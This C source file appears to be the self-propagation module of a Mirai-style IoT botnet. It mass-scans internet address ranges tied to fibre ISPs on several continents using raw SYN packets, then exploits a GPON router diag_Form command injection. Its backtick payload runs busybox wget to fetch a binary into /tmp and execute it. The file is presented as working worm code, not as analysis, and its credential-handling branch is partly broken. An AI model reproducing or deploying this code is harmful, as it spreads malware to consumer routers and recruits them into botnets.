#ifdef SELFREP

#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include "includes.h"
#include "gpon_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

/* GPON Scanner Configuration */
#define GPON_NUM_PORTS 2
static const uint16_t gpon_ports[] = {80, 8080};

/* IP ranges for GPON scanners - targets FTTH/GPON ISPs
 * Combined: Existing ranges + IllusionSec DDOS-archive leaks
 * Focus: Latin America, Asia, Middle East, Africa, Europe where GPON ONTs are vulnerable
 * Major ISPs: Claro, Movistar, Oi, Viettel, BSNL, Airtel, STC, Etisalat
 * Source: github.com/illusionsec/DDOS-archive/tree/main/leaks
 */
static int gpon_ranges[] = {
    /* Africa - Major concentration from leaks */
    197,196,195,194,193,192,165,164,163,162,161,160,159,158,157,156,155,154,153,152,151,150,149,105,102,
    /* Latin America - Major GPON deployment */
    201,200,191,190,189,187,186,181,180,179,177,
    /* Asia - GPON hotspots (China, India, Vietnam, Thailand, Indonesia) */
    125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,
    109,108,107,106,104,103,101,
    /* Middle East */
    95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,
    /* Europe - Eastern/Southern GPON deployments */
    79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,
    /* Asia-Pacific */
    223,222,221,220,219,218,217,211,210,203,202,
    /* North America - Limited GPON coverage */
    45,44,43,42,41,40,39,38,37,36,31,27,14,5,4,2,1,
    -1
};

/* Scanner state */
static int gpon_scanner_pid = 0;
static int gpon_rsck[GPON_NUM_PORTS] = {0};
static char gpon_scanner_rawpkt[GPON_NUM_PORTS][sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
static struct gpon_scanner_connection *conn_table[GPON_NUM_PORTS];
static uint32_t gpon_fake_time[GPON_NUM_PORTS] = {0};
static uint16_t gpon_source_ports[GPON_NUM_PORTS] = {0};

/* Connection state machine states */
#define GPON_SC_CLOSED 0
#define GPON_SC_CONNECTING 1
#define GPON_SC_EXPLOIT_STAGE2 2
#define GPON_SC_EXPLOIT_STAGE3 3
#define GPON_SC_GET_CREDENTIALS 4

static int gpon_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;
        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

static ipv4_t get_random_gpon_ip(void)
{
    uint32_t tmp;
    uint8_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;

    do
    {
        int range_idx = rand() % (sizeof(gpon_ranges) / sizeof(int));
        tmp = rand_next();

        o1 = gpon_ranges[range_idx];
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(o1 == 127 || o1 == 0);

    return INET_ADDR(o1, o2, o3, o4);
}

static void gpon_setup_connection(struct gpon_scanner_connection *conn, int port_idx)
{
    struct sockaddr_in addr = {0};

    if(conn->fd != -1)
        close(conn->fd);

    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        conn->state = GPON_SC_CLOSED;
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(gpon_ports[port_idx]);

    conn->last_recv = gpon_fake_time[port_idx];

    if(conn->state == GPON_SC_EXPLOIT_STAGE2 || conn->state == GPON_SC_EXPLOIT_STAGE3)
    {
        /* Already in exploit stage */
    }
    else
    {
        conn->state = GPON_SC_CONNECTING;
    }

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

static void gpon_scanner_thread(int port_idx)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
    uint16_t target_port = gpon_ports[port_idx];

    LOCAL_ADDR = util_local_addr();

    rand_init();
    gpon_fake_time[port_idx] = time(NULL);
    conn_table[port_idx] = calloc(GPON_SCANNER_MAX_CONNS, sizeof(struct gpon_scanner_connection));
    for(i = 0; i < GPON_SCANNER_MAX_CONNS; i++)
    {
        conn_table[port_idx][i].state = GPON_SC_CLOSED;
        conn_table[port_idx][i].fd = -1;
        conn_table[port_idx][i].credential_index = 0;
    }

    /* Set up raw socket scanning */
    if((gpon_rsck[port_idx] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        exit(0);
    }
    fcntl(gpon_rsck[port_idx], F_SETFL, O_NONBLOCK | fcntl(gpon_rsck[port_idx], F_GETFL, 0));
    i = 1;
    if(setsockopt(gpon_rsck[port_idx], IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        close(gpon_rsck[port_idx]);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    gpon_source_ports[port_idx] = source_port;

    iph = (struct iphdr *)gpon_scanner_rawpkt[port_idx];
    tcph = (struct tcphdr *)(iph + 1);

    /* Set up IPv4 header */
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    /* Set up TCP header */
    tcph->dest = htons(target_port);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    /* Main scanner loop */
    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct gpon_scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        /* Send SYN packets */
        if(gpon_fake_time[port_idx] != last_spew)
        {
            last_spew = gpon_fake_time[port_idx];

            for(i = 0; i < GPON_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)gpon_scanner_rawpkt[port_idx];
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_gpon_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

                tcph->dest = htons(target_port);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(gpon_rsck[port_idx], gpon_scanner_rawpkt[port_idx], sizeof(gpon_scanner_rawpkt[port_idx]), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        /* Read SYN+ACK responses from raw socket */
        last_avail_conn = 0;
        while(TRUE)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct gpon_scanner_connection *conn;

            errno = 0;
            n = recvfrom(gpon_rsck[port_idx], dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != htons(target_port))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for(n = last_avail_conn; n < GPON_SCANNER_MAX_CONNS; n++)
            {
                if(conn_table[port_idx][n].state == GPON_SC_CLOSED)
                {
                    conn = &conn_table[port_idx][n];
                    last_avail_conn = n;
                    break;
                }
            }

            if(conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            gpon_setup_connection(conn, port_idx);
        }

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        /* Build fdsets for select */
        for(i = 0; i < GPON_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;
            conn = &conn_table[port_idx][i];

            if(conn->state != GPON_SC_CLOSED && (gpon_fake_time[port_idx] - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;
                conn->state = GPON_SC_CLOSED;
                free(conn->credentials);
                conn->credential_index = 0;
                util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                continue;
            }

            if(conn->state == GPON_SC_CONNECTING || conn->state == GPON_SC_EXPLOIT_STAGE2 || conn->state == GPON_SC_EXPLOIT_STAGE3)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != GPON_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 3;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        gpon_fake_time[port_idx] = time(NULL);

        /* Process connections */
        for(i = 0; i < GPON_SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[port_idx][i];

            if(conn->fd == -1)
                continue;

            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == GPON_SC_EXPLOIT_STAGE2)
                    {
                        /* Send exploit payload */
                        util_strcpy(conn->payload_buf, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://0.0.0.0/gpon+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0");

                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);

                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                        conn->state = GPON_SC_CLOSED;
                        close(conn->fd);
                        conn->fd = -1;
                        continue;
                    }
                    else if(conn->state == GPON_SC_EXPLOIT_STAGE3)
                    {
                        conn->state = GPON_SC_CLOSED;
                        continue;
                    }
                    else
                    {
                        conn->credentials = malloc(256);
                        conn->state = GPON_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = GPON_SC_CLOSED;
                    continue;
                }
            }

            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(TRUE)
                {
                    int ret = 0;

                    if(conn->state == GPON_SC_CLOSED)
                        break;

                    if(conn->rdbuf_pos == GPON_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + GPON_SCANNER_HACK_DRAIN, GPON_SCANNER_RDBUF_SIZE - GPON_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= GPON_SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = gpon_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, GPON_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == GPON_SC_EXPLOIT_STAGE2)
                            {
                                close(conn->fd);
                                gpon_setup_connection(conn, port_idx);
                                continue;
                            }

                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = GPON_SC_CLOSED;
                            free(conn->credentials);
                            conn->credential_index = 0;
                            util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = gpon_fake_time[port_idx];

                    int len = util_strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;

                    if(conn->state == GPON_SC_GET_CREDENTIALS)
                    {
                        char *out = strtok(conn->rdbuf, " ");
                        while(out != NULL)
                        {
                            if(strstr(out, ""))
                            {
                                memmove(out, out + 11, strlen(out));
                                int i = 0;
                                for(i = 0; i < strlen(out); i++)
                                {
                                    if(out[i] == ';' || out[i] == '"' || out[i] == ' ')
                                        out[i] = 0;
                                }
                                conn->credentials[conn->credential_index] = strdup(out);
                                conn->credential_index++;
                            }
                            out = strtok(NULL, " ");
                        }
                    }

                    if(conn->credentials[0] == NULL && conn->credentials[1] == NULL)
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = GPON_SC_CLOSED;
                        free(conn->credentials);
                        conn->credential_index = 0;
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                    }
                    else
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = GPON_SC_EXPLOIT_STAGE2;
                        conn->credential_index = 0;
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                    }
                }
            }
        }
    }
}

void gpon_scanner_init(void)
{
    int i;

    gpon_scanner_pid = fork();
    if(gpon_scanner_pid > 0 || gpon_scanner_pid == -1)
        return;

    /* Spawn scanner thread for each port */
    for(i = 0; i < GPON_NUM_PORTS; i++)
    {
        if(fork() == 0)
        {
            gpon_scanner_thread(i);
            exit(0);
        }
    }

    /* Parent waits for children */
    while(TRUE)
    {
        sleep(10);
    }
}

void gpon_kill(void)
{
    int i;
    kill(gpon_scanner_pid, 9);
    for(i = 0; i < GPON_NUM_PORTS; i++)
    {
        if(gpon_rsck[i] != 0)
            close(gpon_rsck[i]);
    }
}

#endif
